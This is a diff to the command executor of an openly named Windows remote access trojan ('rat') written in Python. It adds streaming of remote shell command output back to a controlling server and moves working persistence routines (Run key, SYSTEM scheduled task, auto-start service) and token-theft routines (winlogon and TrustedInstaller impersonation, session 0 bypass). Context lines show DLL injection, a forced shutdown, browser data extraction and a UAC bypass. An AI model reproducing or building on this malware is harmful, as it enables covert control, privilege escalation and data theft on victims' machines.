@@ -38,7 +38,7 @@ class CommandExecutor:
             if len(inspect.signature(func).parameters):  # inspect.ismethod(func) and
                 return func(arg)
             return func()
-        else:
+        else:  # TODO：判断必须带desc才能执行
             return self.shell(command)
 
     @desc('execute shell command')
@@ -53,6 +53,28 @@ class CommandExecutor:
             return 0, stderr
         else:
             return 1, ''
+
+    def read_stream(self, stream):
+        while True:
+            line = stream.readline()
+            if not line:
+                break
+            self.send_to_server(1, line.decode(locale.getdefaultlocale()[1]).strip('\n'), 0)
+
+    @desc('execute shell command and read data from stdout and stderr streams in parallel')
+    def read(self, command):
+        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                               stdin=subprocess.DEVNULL)
+        stdout_thread = threading.Thread(target=self.read_stream, args=(cmd.stdout,))
+        stderr_thread = threading.Thread(target=self.read_stream, args=(cmd.stderr,))
+        stdout_thread.daemon = True
+        stderr_thread.daemon = True
+        stdout_thread.start()
+        stderr_thread.start()
+        # 等待命令完成
+        cmd.wait()
+        time.sleep(0.2)
+        self.send_to_server(1, "Command completed successfully", 1)
 
     def send_to_server(self, status, result, end):
         self.socket.send_result(self.command_id, status, result, end)
@@ -166,15 +188,8 @@ class CommandExecutor:
         class_name = "".join(word.capitalize() for word in module_name.split("_"))
         return class_name
 
-    # TODO:直接通过名字
     def get_main_class(self, module, module_name):
         return getattr(module, self.get_camel_case_class(module_name))
-        # # 使用inspect.getmembers获取模块中的所有成员
-        # for name, obj in inspect.getmembers(module):
-        #     # 判断是否为类，并排除抽象类
-        #     if inspect.isclass(obj) and not inspect.isabstract(obj):
-        #         return obj
-        # return None
 
     @desc('load module and execute in a new thread')
     def load(self, arg):
@@ -250,95 +265,12 @@ class CommandExecutor:
         ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
         ctypes.windll.ntdll.ZwShutdownSystem(2)
 
-    @desc('apply persistence mechanism')
-    @enclosing
-    def persist(self, args):
-
-        @desc('create registry key')
-        def registry(option):
-            import winreg
-            if not option:
-                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
-                                     winreg.KEY_WRITE)
-                winreg.SetValueEx(key, 'rat', 0, winreg.REG_SZ, EXECUTABLE_PATH)
-                winreg.CloseKey(key)
-                return 1, 'registry key created'
-            elif option == '--undo':
-                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
-                                     winreg.KEY_WRITE)
-                winreg.DeleteValue(key, 'rat')
-                winreg.CloseKey(key)
-                return 1, 'registry key removed'
-            else:
-                return 0, 'unknown option: {}'.format(option)
-
-        @desc('schedule task')
-        @require_admin
-        def schtasks(option):
-            if not option:
-                return self.shell(
-                    f'schtasks.exe /create /tn rat /sc onlogon /ru system /rl highest /tr "{EXECUTABLE_PATH}" /f')
-            elif option == '--undo':
-                return self.shell('schtasks.exe /delete /tn rat /f')
-            else:
-                return 0, 'unknown option: {}'.format(option)
-
-        @desc('create service')
-        @require_admin
-        def service(option):
-            if not option:
-                return self.shell(f'sc create rat binpath="{EXECUTABLE_PATH}" start= auto')
-            elif option == '--undo':
-                return self.shell('sc delete rat')
-            else:
-                return 0, 'unknown option: {}'.format(option)
-
-        return locals()
-
     @desc('inject DLL into process')
     @params('pid', 'dll_path')
     def inject(self, this, args):
         if not os.path.isfile(this.dll_path):
             return 0, 'File does not exist: {}'.format(this.dll_path)
         return create_remote_thread(int(this.pid), os.path.abspath(this.dll_path))
-
-    @desc('duplicate token from process')
-    @enclosing
-    def stealtoken(self, args):
-        @desc('run as system')
-        @require_admin
-        def system():
-            enable_privilege('SeDebugPrivilege')
-            pid = create_process_with_token(duplicate_token(get_process_token(get_pid('winlogon.exe'))),
-                                            LP_APPLICATION_NAME, LP_COMMAND_LINE)
-            return 1, 'Process created: {}'.format(pid)
-
-        @desc('run as trusted installer')
-        @require_integrity('System')
-        def ti():
-            enable_privilege('SeDebugPrivilege')
-            start_service('TrustedInstaller')
-            h_token = duplicate_token(get_process_token(get_pid('TrustedInstaller.exe')))
-            pid = create_process_with_token(h_token, LP_APPLICATION_NAME, LP_COMMAND_LINE)
-            return 1, 'Process created: {}'.format(pid)
-
-        @desc('bypass session 0 isolation and run as user')
-        @require_integrity('System')
-        def user():
-            enable_privilege('SeTcbPrivilege')
-            h_token = duplicate_token(get_user_token())
-            pid = create_process_as_user(h_token, LP_APPLICATION_NAME, LP_COMMAND_LINE)
-            return 1, 'Process created: {}'.format(pid)
-
-        @desc('bypass session 0 isolation and run as admin')
-        @require_integrity('System')
-        def admin():
-            enable_privilege('SeTcbPrivilege')
-            h_token = duplicate_token(get_linked_token(get_user_token()))
-            pid = create_process_as_user(h_token, LP_APPLICATION_NAME, LP_COMMAND_LINE)
-            return 1, 'Process created: {}'.format(pid)
-
-        return locals()
 
     @desc('extract data from browser')
     @params('browser', 'type')
@@ -400,6 +332,89 @@ class CommandExecutor:
             return 0, f'File does not exist: {zip_name}'
         shutil.unpack_archive(zip_name, os.getcwd())
         return 1, f'Archive extracted to {os.getcwd()}'
+
+    @desc('apply persistence mechanism')
+    @enclosing
+    def persist(self, args):
+
+        @desc('create registry key')
+        def registry(option):
+            import winreg
+            if not option:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
+                                     winreg.KEY_WRITE)
+                winreg.SetValueEx(key, 'rat', 0, winreg.REG_SZ, EXECUTABLE_PATH)
+                winreg.CloseKey(key)
+                return 1, 'registry key created'
+            elif option == '--undo':
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
+                                     winreg.KEY_WRITE)
+                winreg.DeleteValue(key, 'rat')
+                winreg.CloseKey(key)
+                return 1, 'registry key removed'
+            else:
+                return 0, 'unknown option: {}'.format(option)
+
+        @desc('schedule task')
+        @require_admin
+        def schtasks(option):
+            if not option:
+                return self.shell(
+                    f'schtasks.exe /create /tn rat /sc onlogon /ru system /rl highest /tr "{EXECUTABLE_PATH}" /f')
+            elif option == '--undo':
+                return self.shell('schtasks.exe /delete /tn rat /f')
+            else:
+                return 0, 'unknown option: {}'.format(option)
+
+        @desc('create service')
+        @require_admin
+        def service(option):
+            if not option:
+                return self.shell(f'sc create rat binpath="{EXECUTABLE_PATH}" start= auto')
+            elif option == '--undo':
+                return self.shell('sc delete rat')
+            else:
+                return 0, 'unknown option: {}'.format(option)
+
+        return locals()
+
+    @desc('duplicate token from process')
+    @enclosing
+    def stealtoken(self, args):
+        @desc('run as system')
+        @require_admin
+        def system():
+            enable_privilege('SeDebugPrivilege')
+            pid = create_process_with_token(duplicate_token(get_process_token(get_pid('winlogon.exe'))),
+                                            LP_APPLICATION_NAME, LP_COMMAND_LINE)
+            return 1, 'Process created: {}'.format(pid)
+
+        @desc('run as trusted installer')
+        @require_integrity('System')
+        def ti():
+            enable_privilege('SeDebugPrivilege')
+            start_service('TrustedInstaller')
+            h_token = duplicate_token(get_process_token(get_pid('TrustedInstaller.exe')))
+            pid = create_process_with_token(h_token, LP_APPLICATION_NAME, LP_COMMAND_LINE)
+            return 1, 'Process created: {}'.format(pid)
+
+        @desc('bypass session 0 isolation and run as user')
+        @require_integrity('System')
+        def user():
+            enable_privilege('SeTcbPrivilege')
+            h_token = duplicate_token(get_user_token())
+            pid = create_process_as_user(h_token, LP_APPLICATION_NAME, LP_COMMAND_LINE)
+            return 1, 'Process created: {}'.format(pid)
+
+        @desc('bypass session 0 isolation and run as admin')
+        @require_integrity('System')
+        def admin():
+            enable_privilege('SeTcbPrivilege')
+            h_token = duplicate_token(get_linked_token(get_user_token()))
+            pid = create_process_as_user(h_token, LP_APPLICATION_NAME, LP_COMMAND_LINE)
+            return 1, 'Process created: {}'.format(pid)
+
+        return locals()
 
     @desc('elevate as admin without uac prompt')
     @enclosing
